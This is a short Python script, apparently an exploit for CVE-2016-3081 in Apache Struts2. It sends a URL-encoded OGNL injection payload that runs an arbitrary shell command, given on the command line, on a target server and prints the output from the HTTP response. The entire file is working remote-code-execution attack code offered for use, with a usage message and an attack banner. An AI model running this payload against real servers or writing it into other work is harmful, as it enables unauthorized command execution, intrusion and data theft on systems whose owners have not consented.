#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys

def exploit(url, cmd):
	pay="?method%3A%23_memberAccess%3d%40++++++++ognl%20%20%20%20%20.%20OgnlContext+++++%20%40DEFAULT%5fMEMBER%5fACCESS%2c"
	pay+="%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c"
	pay+="%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c"
	pay+="%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c"
	pay+="%23d%3dnew%20char%5B51020%5D%2c"
	pay+="%23c.read%28%23d%29%2c"
        pay+="%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c"
	pay+="%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command="+cmd

	response = requests.get(url+pay)
	print(response.text)
	print(response.url)

if __name__ == "__main__":
	if len(sys.argv) != 3:
		print("struts_exploit.py url cmd")
	else:
		print("CVE-2016-3081 Apache Struts2 Attack!")
		url = sys.argv[1]
		cmd = sys.argv[2]
		print("cmd : %s\n" % cmd)
		exploit(url,cmd)

